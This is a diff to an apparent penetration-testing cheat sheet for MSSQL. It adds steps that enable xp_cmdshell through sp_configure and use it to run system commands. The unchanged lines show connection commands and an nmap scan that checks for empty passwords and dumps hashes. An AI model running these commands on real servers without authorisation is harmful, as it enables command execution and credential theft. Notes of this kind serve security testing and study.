@@ -112,6 +112,30 @@ sqsh <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> .<
 <span class="c"># connect to MSSQL on windows</span>
 sqlcmd <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
+<span class="c"># in MSSQL prompt, execute system commands with xp_cmdshell</span>
+<span class="c"># this is rarely enabled but worth a try</span>
+xp_cmdshell <span class="s1">'whoami'</span>
+GO <span class="c"># necessary to process commands with sqlcmd</span>
+
+<span class="c"># if xp_cmdshell is not enabled with we have proper permissions</span>
+<span class="c"># to change that, enable it:</span>
+
+<span class="c"># allow advanced options to be changed</span>
+EXECUTE sp_configure <span class="s1">'show advanced options'</span>, 1
+GO
+
+<span class="c"># update configured value for advanced options</span>
+RECONFIGURE
+GO
+
+<span class="c"># enable xp_cmdshell</span>
+EXECUTE sp_configure <span class="s1">'xp_cmdshell'</span>, 1
+GO
+
+<span class="c"># update configured value for xp_cmdshell</span>
+RECONFIGURE
+GO
+
 <span class="c"># scan MSSQL server with nmap</span>
 <span class="nb">sudo </span>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 &lt;IP address&gt;
 
